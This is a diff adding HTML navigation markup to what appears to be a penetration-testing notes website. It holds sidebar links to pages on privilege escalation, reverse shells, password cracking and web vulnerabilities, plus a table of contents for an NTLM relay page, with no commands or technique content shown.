+  <span class="md-ellipsis">
+    Linux
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_11">
+            <span class="md-nav__icon md-icon"></span>
+            Linux
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/1-priv-esc-methodology-linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Linux Privilege Escalation Cheatsheet
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/docker/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Priv Esc Docker
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/linux-priv-esc-permissions/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Linux Priv Esc Though Permissions
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/linux-priv-esc-python/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Priviledge Escalation Using Python
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/network/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Network Enumeration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/passwd/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Write to /etc/passwd
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/reverse-shell/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Reverse Shell
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/smb/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Linux SMB Stuff
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/using-curl/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Usage of curl
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/using-tcpdump/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Using tcpdump
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12" >
+        
+          
+          <label class="md-nav__link" for="__nav_12" id="__nav_12_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Network Enumeration
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_12_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_12">
+            <span class="md-nav__icon md-icon"></span>
+            Network Enumeration
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Network%20Enumeration/Linux-Priv-Esc-Process/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Priviledge Escalation though process
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Network%20Enumeration/ftp-fuzzing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    FTP Fuzzing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Network%20Enumeration/nmap-scanning/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Nmap Scanning 🗺️
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Network%20Enumeration/snmp-fuzzing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SNMP Fuzzing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_13" >
+        
+          
+          <label class="md-nav__link" for="__nav_13" id="__nav_13_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Other Resources Notes
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_13_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_13">
+            <span class="md-nav__icon md-icon"></span>
+            Other Resources Notes
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Other%20Resources%20Notes/linux-priv-esc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Linux Priv Esc
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Other%20Resources%20Notes/windows-privilege-escalation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows Privilege Escalation Guide
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_14" >
+        
+          
+          <label class="md-nav__link" for="__nav_14" id="__nav_14_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Password Fuzzing
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_14_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_14">
+            <span class="md-nav__icon md-icon"></span>
+            Password Fuzzing
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Password%20Fuzzing/default-passwords/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Default Passwords
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Password%20Fuzzing/emum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Password Guessing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Password%20Fuzzing/use-hashcat/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Hashcat Usage
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Password%20Fuzzing/use-hydra/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Hydra Usage
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Password%20Fuzzing/use-john/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Usage Of John
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Password%20Fuzzing/using-burp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Use Burp Intruder
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Password%20Fuzzing/web-passwords/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Fuzz Webapplication Password Guide
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_15" >
+        
+          
+          <label class="md-nav__link" for="__nav_15" id="__nav_15_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Ports & Applications
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_15_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_15">
+            <span class="md-nav__icon md-icon"></span>
+            Ports & Applications
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/git/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Git Stuff
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/laravel/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Laravel Fuzzing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-111-portmapper/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Port 111 - Portmapper
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-113/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Port 113 - Ident
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-161-snmp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SNMP
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-21-ftp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Port 21: Fuzzing FTP
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-22-ssh/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Port 22 - SSH
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-25-smtp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SMTP Stuff
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-3128-squid/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Port 3128: Fuzzing Squid Proxy
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-3389-rdp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Port 3389 RDP
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-445-smb/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Fuzzing SMB
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-49152-rpcclient/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    RPC
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-53-dns/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Port 53 - Enumerate DNS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_16" >
+        
+          
+          <label class="md-nav__link" for="__nav_16" id="__nav_16_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Usernames
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_16_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_16">
+            <span class="md-nav__icon md-icon"></span>
+            Usernames
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Usernames/enum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Enumerate Usernames
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_17" >
+        
+          
+          <label class="md-nav__link" for="__nav_17" id="__nav_17_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Web Applications
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_17_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_17">
+            <span class="md-nav__icon md-icon"></span>
+            Web Applications
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Applications/apache-tomcat-fuzzing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Apache Tomcat Fuzzing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Applications/automate-enum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Automated Enumeration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Applications/fuzzing-php/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Fuzzing with PHP
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Applications/mysql-fuzzing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    MySQL Database Fuzzing &amp; Testing 🗄️
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Applications/postgre-fuzzing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Postgre Sql Fuzzing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Applications/sql-injection-fuzzing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SQL Injection Fuzzing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Applications/web-fuzzing-with-ffuf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Web Fuzzing Using FFUF 🔍
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Applications/wordpress/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Fuzzing Wordpress
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_18" >
+        
+          
+          <label class="md-nav__link" for="__nav_18" id="__nav_18_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Web Vulneratbilites
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_18_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_18">
+            <span class="md-nav__icon md-icon"></span>
+            Web Vulneratbilites
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Vulneratbilites/cmd-injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Command Injection
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Vulneratbilites/lfi/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Local File Inclusion (LFI)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Vulneratbilites/sql-injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Sql injection
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Vulneratbilites/xss/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Cross-Site Scripting (XSS)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_19" >
+        
+          
+          <label class="md-nav__link" for="__nav_19" id="__nav_19_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Windows
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_19_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_19">
+            <span class="md-nav__icon md-icon"></span>
+            Windows
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/1-priv-esc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows Privilege Escalation Guide
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/av-bypass/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    AV Bypass
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/download-file/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Download file to windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/file-permissions/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    File Permissions On Windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/kernel-exploit/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Kernel Exploits
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/mimkatz/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Usage of Mimkatz
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/powershell/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Powershell Commands
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/reverse-shell/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows Reverse Shell
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/service-abuse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows Service Abuse
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/uac/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    UAC Windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/windows-shell-help/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows Shell Helpul commands
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/winpeas/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Winpeas Usage
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_19_13" >
+        
+          
+          <label class="md-nav__link" for="__nav_19_13" id="__nav_19_13_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Groups
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_19_13_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_19_13">
+            <span class="md-nav__icon md-icon"></span>
+            Groups
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/Groups/server-operator-group/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Server Operator Group
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_19_14" >
+        
+          
+          <label class="md-nav__link" for="__nav_19_14" id="__nav_19_14_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Privileges
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_19_14_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_19_14">
+            <span class="md-nav__icon md-icon"></span>
+            Privileges
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/Privileges/SeBackupPrivilege/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows - SeBackupPrivilege
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/Privileges/SeImporsornatePriv/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SeImpersonatePrivilege
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      Overview
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#prerequisites" class="md-nav__link">
+    <span class="md-ellipsis">
+      Prerequisites
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Prerequisites">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#required-tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      Required Tools
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#installation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Installation
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#understanding-ntlm-relay" class="md-nav__link">
+    <span class="md-ellipsis">
+      Understanding NTLM Relay
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Understanding NTLM Relay">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-is-ntlm-relay" class="md-nav__link">
+    <span class="md-ellipsis">
+      What is NTLM Relay?
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#requirements-for-success" class="md-nav__link">
+    <span class="md-ellipsis">
+      Requirements for Success
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#common-attack-scenarios" class="md-nav__link">
+    <span class="md-ellipsis">
+      Common Attack Scenarios
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      Reconnaissance
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Reconnaissance">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#step-1-identify-targets-without-smb-signing" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 1: Identify Targets Without SMB Signing
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-2-identify-domain-controllers" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 2: Identify Domain Controllers
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#step-3-network-discovery" class="md-nav__link">
+    <span class="md-ellipsis">
+      Step 3: Network Discovery
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#attack-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Attack Execution
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Attack Execution">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#method-1-smb-relay-with-responder-ntlmrelayx" class="md-nav__link">
+    <span class="md-ellipsis">
+      Method 1: SMB Relay with Responder + ntlmrelayx
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Method 1: SMB Relay with Responder + ntlmrelayx">
+      <ul class="md-nav__list">
+        
